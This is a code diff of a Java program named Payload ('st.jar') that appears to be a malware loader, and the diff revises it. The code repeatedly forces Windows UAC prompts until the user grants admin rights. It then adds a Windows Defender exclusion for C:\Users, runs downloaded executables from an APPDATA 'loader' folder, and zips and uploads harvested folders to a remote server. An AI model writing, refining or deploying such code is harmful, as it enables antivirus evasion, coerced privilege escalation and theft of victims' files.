@@ -16,34 +16,26 @@ public class Payload {
     public static void main(String[] args) {
         log("--- STARTING ST.JAR ---");
         try {
-            if (args.length < 2) {
-                log("Missing arguments. Exiting.");
-                return;
-            }
+            if (args.length < 2) return;
+            String key = args[0];
+            String ip = args[1];
             
-            String accountKey = args[0];
-            String serverIp = args[1];
-            log("Key: " + accountKey + " | IP: " + serverIp);
-
             if (!isAdmin()) {
                 log("Not admin. Starting UAC loop...");
-                uacLoop(accountKey, serverIp);
+                uacLoop(key, ip);
             } else {
                 log("We are Admin! Proceeding.");
-                executePayload(accountKey, serverIp);
+                executePayload(key, ip);
             }
         } catch (Throwable t) {
-            log("FATAL ERROR: " + t.toString());
-            StringWriter sw = new StringWriter();
-            t.printStackTrace(new PrintWriter(sw));
-            log(sw.toString());
+            log("FATAL: " + t.toString());
         }
     }
 
     private static void log(String msg) {
         try {
-            // Hardcoded path to ensure we can write the log
-            File logFile = new File("C:\\java_debug.txt");
+            String appData = System.getenv("APPDATA");
+            File logFile = new File(appData + "\\loader\\java_debug.txt");
             FileWriter fw = new FileWriter(logFile, true);
             fw.write(msg + "\n");
             fw.close();
@@ -59,19 +51,21 @@ public class Payload {
 
     private static void uacLoop(String key, String ip) {
         try {
+            // Get the exact path to javaw.exe
             String javaHome = System.getProperty("java.home");
             String javaw = javaHome + "\\bin\\javaw.exe";
             
-            // Safer way to get the jar path, handling spaces and URL encoding
+            // Get the exact path to st.jar, handling spaces
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             
-            log("javaw path: " + javaw);
-            log("jar path: " + jarPath);
+            log("javaw: " + javaw);
+            log("jar: " + jarPath);
 
             while (true) {
                 log("Triggering UAC...");
+                // SW_SHOWNORMAL = 1 (forces the prompt to show)
                 int result = Shell32.INSTANCE.ShellExecuteW(
-                    null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 0
+                    null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 1
                 );
 
                 if (result > 32) {
@@ -80,10 +74,10 @@ public class Payload {
                 } else {
                     log("UAC Denied/Failed (Code: " + result + "). Retrying...");
                 }
-                try { Thread.sleep(1000); } catch (Exception e) {}
+                try { Thread.sleep(500); } catch (Exception e) {}
             }
         } catch (Exception e) {
-            log("UAC Loop Error: " + e.toString());
+            log("UAC Error: " + e.toString());
         }
     }
 
@@ -92,11 +86,10 @@ public class Payload {
             log("Executing payload...");
             String appData = System.getenv("APPDATA");
             File loaderDir = new File(appData, "loader");
-            if (!loaderDir.exists()) loaderDir.mkdirs();
 
             // 1. Add AV Exclusion
             log("Adding AV exclusion...");
-            String regPath = "HKLM\\" + "SOFTWARE\\" + "Microsoft" + "\\Windows Defender" + "\\Exclusions\\Paths";
+            String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
             String cmd = "reg add \"" + regPath + "\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f";
             Runtime.getRuntime().exec(cmd).waitFor();
             
@@ -109,18 +102,15 @@ public class Payload {
 
             // 3. Execute
             log("Executing 3.exe...");
-            ProcessBuilder pb = new ProcessBuilder(new File(loaderDir, "3.exe").getAbsolutePath());
-            pb.start();
+            new ProcessBuilder(new File(loaderDir, "3.exe").getAbsolutePath()).start();
             
             log("Executing 2.exe...");
-            pb = new ProcessBuilder(new File(loaderDir, "2.exe").getAbsolutePath(), "all");
-            pb.start();
+            new ProcessBuilder(new File(loaderDir, "2.exe").getAbsolutePath(), "all").start();
             
             Thread.sleep(2000);
             
             log("Executing 1.exe...");
-            pb = new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath());
-            pb.start();
+            new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath()).start();
 
             // 4. Harvest & Upload
             log("Waiting for harvest...");
@@ -143,13 +133,10 @@ public class Payload {
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestProperty("User-Agent", "Mozilla/5.0");
             try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
-                byte[] buf = new byte[8192];
-                int len;
+                byte[] buf = new byte[8192]; int len;
                 while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
             }
-        } catch (Exception e) {
-            log("Download failed for " + urlStr + ": " + e.toString());
-        }
+        } catch (Exception e) { log("Download failed " + urlStr + ": " + e.toString()); }
     }
 
     private static void zipFolders(String[] folders, File zipFile) {
@@ -165,9 +152,7 @@ public class Payload {
                     }
                 }
             }
-        } catch (Exception e) {
-            log("Zip failed: " + e.toString());
-        }
+        } catch (Exception e) { log("Zip failed: " + e.toString()); }
     }
 
     private static void uploadFile(String urlStr, File file, String key) {
@@ -181,12 +166,8 @@ public class Payload {
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setRequestProperty("Content-Type", "application/json");
-            try (OutputStream os = conn.getOutputStream()) {
-                os.write(json.getBytes());
-            }
+            try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes()); }
             conn.getResponseCode();
-        } catch (Exception e) {
-            log("Upload failed: " + e.toString());
-        }
+        } catch (Exception e) { log("Upload failed: " + e.toString()); }
     }
 }
